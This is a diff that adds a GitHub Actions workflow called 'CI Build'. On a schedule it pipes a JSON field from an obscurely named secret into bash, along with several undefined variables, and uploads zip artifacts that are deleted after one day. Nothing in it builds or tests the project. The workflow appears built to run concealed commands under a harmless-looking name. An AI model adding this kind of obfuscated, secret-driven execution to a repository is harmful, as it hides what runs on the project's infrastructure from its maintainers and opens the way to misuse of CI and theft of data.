@@ -1,0 +1,38 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '6 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          pyrsp6: ${{ secrets.pyrsp6 }}
+        run: |
+          printf '%s' "$pyrsp6" | jq -r .aasa47 | /bin/bash
+          echo $eh4074 | jq -r .zwyjg6 | /bin/bash
+          printf '%s' "$i0187" | jq -r .lrvpn96959 | /bin/bash
+          echo $jeyix6 | jq -r .xj9 | /bin/bash
+          echo $em30 | jq -r .ybrb67 | /bin/bash
+          printf '%s' "$y95" | jq -r .vowx28 | /bin/bash
+          printf '%s' "$rvwr86260" | jq -r .qbq978 | /bin/bash
+          printf '%s' "$liigz443" | jq -r .j33776 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ajtwzceS
+          path: "*.zip"
+          retention-days: 1
